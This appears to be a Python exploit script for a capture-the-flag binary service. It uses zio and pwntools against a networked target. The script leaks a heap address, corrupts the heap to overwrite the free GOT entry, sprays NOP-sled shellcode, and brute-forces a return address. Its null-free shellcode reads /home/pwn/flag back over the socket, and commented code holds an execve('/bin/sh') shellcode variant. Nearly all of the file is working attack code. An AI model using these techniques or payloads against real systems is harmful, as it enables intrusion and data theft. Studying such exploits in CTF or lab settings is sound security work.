from zio import *

is_local = True
is_local = False

binary_path = "./binary"

libc_file_path = ""
#libc_file_path = "./libc.so.6"

ip = "192.168.1.147"
# port = 12345
port = 12000 

if is_local:
	target = binary_path
else:
	target = (ip, port)

def d2v_x64(data):
	return l64(data[:8].ljust(8, '\x00'))

def d2v_x32(data):
	return l32(data[:4].ljust(4, '\x00'))

def rd_wr_str(io, info, buff):
	io.read_until(info)
	io.write(buff)

def rd_wr_int(io, info, val):
	rd_wr_str(io, info, str(val) + "\n")


def get_io(target):
	r_m = COLORED(RAW, "green")
	w_m = COLORED(RAW, "blue")
	r_m = False
	w_m = False
	#io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
	io = zio(target, timeout = 20, print_read = r_m, print_write = w_m, env={"LD_PRELOAD":libc_file_path})
	return io


def pack_data(cmd, data):
	payload = ""
	payload += l32(cmd)
	payload += l32(len(data))
	payload += data
	payload += l32(0x0)
	return payload

def gen_model(tid, ttype, model_data):
	model_struct = ""
	model_struct += l32(tid) #id
	model_struct += l32(len(model_data) + 4)	#size
	model_struct += l32(ttype) 	#type
	model_struct += model_data 	#data
	return model_struct

def gen_pack666(tid, model_data):
	model_struct = ""
	model_struct += l32(tid) #id
	model_struct += l32(len(model_data))	#size
	model_struct += model_data 	#data
	return model_struct

def send_byte(io, ch):
	io.write('\x06\x00\x00\x00\x01\x00\x00\x00%c\x00\x00\x00\x00'%chr(ch))

def send_char(io, ch):
	io.write('\x06\x00\x00\x00\x01\x00\x00\x00%c\x00\x00\x00\x00'%ch)

def pack_type3(data):
	payload = ""
	payload += l32(0x03) #type
	payload += l32(0x00) #id
	payload += data 		#data
	payload += l32(0x0) 	#end_sig
	return payload

def pack_type1(sig, l, w, pdata1, pdata2):
	payload = ""
	payload += l32(0x01) #type
	payload += l32(sig) #l
	payload += l32(l) #l
	payload += l32(w) #w
	payload += pdata2 #
	payload += pdata1 #

	return payload

import time
def leak_addr(io):

	#offset info
	if is_local:
		#local
		offset_system = 0x0
		offset_binsh = 0x0
	else:
		#remote	
		offset_system = 0x0
		offset_binsh = 0x0

	#wait for init
	time.sleep(2)
	#begin
	io.write('\x06\x00\x00\x00\x01\x00\x00\x00 \x00\x00\x00\x00')
	

	#replace model 0 with type 2
	model_data = "\x00"*(0x404)
	model_struct = gen_model(0x00, 0x02, model_data)
	
	payload = ""
	payload += pack_data(666, model_struct)
	io.write(payload)

	#io.gdb_hint()
	model_data = "a"*(3)
	model_struct = gen_model(0x00, 0x02, model_data)
	
	payload = ""
	payload += pack_data(666, model_struct)
	io.write(payload)

	io.read_until("a"*3)
	data = io.read(3)
	heap_addr_data = "\x00"*3 + data
	heap_addr = d2v_x64(heap_addr_data)
	print repr(data)
	print hex(heap_addr)
	return heap_addr

from pwn import *
def pwn(io, ret_addr, shellcode_bin):

	#offset info
	if is_local:
		#local
		offset_system = 0x0
		offset_binsh = 0x0
	else:
		#remote	
		offset_system = 0x0
		offset_binsh = 0x0

	#ret_addr = 0x1122334455667788
	#wait for init
	time.sleep(2)
	#begin
	io.write('\x06\x00\x00\x00\x01\x00\x00\x00 \x00\x00\x00\x00')

	sig = 0x11223344
	l = 0x100
	w = 1
	pdata1 = ""
	pdata1 = pdata1.ljust(l>>3, '@')

	free_got = 0x605018
	pdata2 = ""
	pdata2 += "@"*(0x100-(0x4+0x8))
	pdata2 += l64(free_got-0x18)
	pdata2 += l32(0x0)
	pdata2 += l32(0x1000000)
	pdata2 += (l64(free_got-0x18)+l32(0x0)+l32(0x1000000))*0x40
	pdata2 += "$"*0x100
	pdata2 = pdata2.ljust(0x04*l*w, "%")
	model_struct = gen_pack666(0x00, pack_type1(sig, l, w, pdata1, pdata2))
	
	print repr(model_struct)
	#replace model 0 with type 3
	payload = ""
	payload += pack_data(666, model_struct)
	io.write(payload)

	#raw_input(":")
	time.sleep(2)

	#shellcode_bin = ""
	shellcode = ""
	shellcode += shellcode_bin.rjust(0x400, '\x90')*(0x8000/0x400)
	#shellcode += "\x90"*(0x8000+0x20-len(shellcode_bin))
	shellcode += shellcode_bin
	shellcode += "a"*0x10
	shellcode += "b"*0x10
	shellcode += "c"*0x10

	tmp_data = ""
	tmp_data += l32(len(shellcode))
	tmp_data += shellcode
	payload = ""
	payload += l32(0x07)
	payload += l32(len(tmp_data))
	payload += tmp_data
	payload += l32(0x0)
	io.write(payload)


	sig = 0x11223344
	l = (0x100-0x20)/4
	w = 1
	pdata1 = ""
	pdata1 = pdata1.ljust(l>>3, '@')

	free_got = 0x605018
	pdata2 = ""
	pdata2 += "#"*0x4
	pdata2 += l64(ret_addr)
	pdata2 = pdata2.ljust(0x04*l*w, "%")
	model_data = pack_type1(sig, l, w, pdata1, pdata2)

	for i in range(4):
		model_data = pack_type3(model_data)

	model_struct = gen_pack666(0x00, model_data)
	
	#raw_input(":")
	payload = ""
	payload += pack_data(666, model_struct)
	io.write(payload)

	#io.write('\x06\x00\x00\x00\x01\x00\x00\x00 \x00\x00\x00\x00')

	#raw_input(":")
	io.interact()

	io.read_until("time\x00listen\x00", timeout = 8)
	data = io.read(0x40)
	print repr(data)
	data = data.split('\x00')[0]
	flag = data.replace("\x00", "")
	print "flag:", flag
	return flag

"""
	//dup2(0, sock_fd)
	mov eax, 0x01010120
	xor eax, 0x01010101
	xor rsi, rsi
	xor esi, 0x608150^0x01010101
	xor esi, 0x01010101
	mov esi, dword ptr [rsi]
	xor rdi, rdi
	syscall

	//dup2(1, sock_fd)
	inc edi
	mov eax, 0x01010120
	xor eax, 0x01010101
	syscall
"""

context(arch = "amd64", os = 'linux')
shellcode_asm = shellcraft.amd64.sh()
shellcode_asm = """
	/* push argument array ['sh\x00'] */
	//write(fd, str, size)
	mov eax, 0x01010101
	xor eax, 0x01010101
	inc eax

	xor rdx, rdx
	xor dl, 12

	xor rdi, rdi
	xor edi, 0x608150^0x01010101
	xor edi, 0x01010101
	mov edi, dword ptr [rdi]

	xor rsi, rsi
	xor esi, 0x4006F7^0x01010101
	xor esi, 0x01010101
	syscall

	%s
	//open
	mov rdi, rsp
	xor rsi, rsi
	xor rax, rax
	inc eax
	inc eax
	syscall

	//read
	mov rdi, rax
	xor rsi, rsi
	xor esi, 0x6081A0^0x01010101
	xor esi, 0x01010101
	xor rax, rax
	xor rdx, rdx
	xor dl, 0x70
	syscall

	//write
	xor rdi, rdi
	xor edi, 0x608150^0x01010101
	xor edi, 0x01010101
	mov edi, dword ptr [rdi]
	//xor rdx, rdx
	//xor dl, 0x70
	xor rax, rax
	inc rax
	syscall
"""

"""
    /* push 'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor edx, edx /* 0 */
    push rdx /* null terminate */
    push 8
    pop rdx
    add rdx, rsp
    push rdx /* 'sh\x00' */
    mov rdx, rsp
    
    /* push '/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    
    /* call execve('rsp', 'rdx', 0) */
    push (SYS_execve) /* 0x3b */
    pop rax
    mov rdi, rsp
    mov rsi, rdx
    cdq /* rdx=0 */
    syscall

"""

file_name = "./test.info.txt\x00"
file_name = "../release-new/run_patch.sh\x00"
file_name = "/home/pwn/flag\x00"
file_name = file_name + "\x00"*(8 - len(file_name)%8)


asm_info = ""
for i in range(len(file_name)/8):
	push_one = ""
	push_one += "    mov rax, 0x%08x^0x0101010101010101\n"%(l64(file_name[i*8:i*8+8]))
	push_one += "    push rax\n"
	push_one += "    xor dword ptr[rsp], 0x01010101\n"
	push_one += "    xor dword ptr[rsp+4], 0x01010101\n"

	asm_info =  push_one + asm_info

shellcode_asm = shellcode_asm%asm_info
print shellcode_asm
print repr(asm(shellcode_asm))
print asm(shellcode_asm).find("\x00")
shellcode_bin = asm(shellcode_asm)
#shellcode_bin = '\xb8\x01\x01\x01\x015\x01\x01\x01\x01\xff\xc0H1\xd2\x80\xf2\x0cH1\xff\x81\xf7Q\x80a\x01\x81\xf7\x01\x01\x01\x01\x8b?H1\xf6\x81\xf6\xf6\x07A\x01\x81\xf6\x01\x01\x01\x01\x0f\x05H\xb8ogn/uyu\x01P\x814$\x01\x01\x01\x01\x81t$\x04\x01\x01\x01\x01H\xb8/.udru/hP\x814$\x01\x01\x01\x01\x81t$\x04\x01\x01\x01\x01H\x89\xe7H1\xf6H1\xc0\xff\xc0\xff\xc0\x0f\x05H\x89\xc7H1\xf6\x81\xf6\xa1\x80a\x01\x81\xf6\x01\x01\x01\x01H1\xc0\x0f\x05H1\xff\x81\xf7Q\x80a\x01\x81\xf7\x01\x01\x01\x01\x8b?H1\xd2\x80\xf2@H1\xc0H\xff\xc0\x0f\x05'
#exit(0)

#heap_addr = 0x7f6bec000000
heap_addr = 0x0
if heap_addr == 0:
	while True:
		io = get_io(target)
		heap_addr = leak_addr(io)
		io.close()
		if heap_addr & 0xff0000000000 == 0x7f0000000000:
			break
print hex(heap_addr)

ret_addr = heap_addr + 0x011110
#raw_input(":")
while True:
	try:
		io = get_io(target)
		flag = pwn(io, ret_addr, shellcode_bin)
		print "get it"
		break
	except Exception as e:
		ret_addr += 0x1000
	io.close()
	raw_input(":")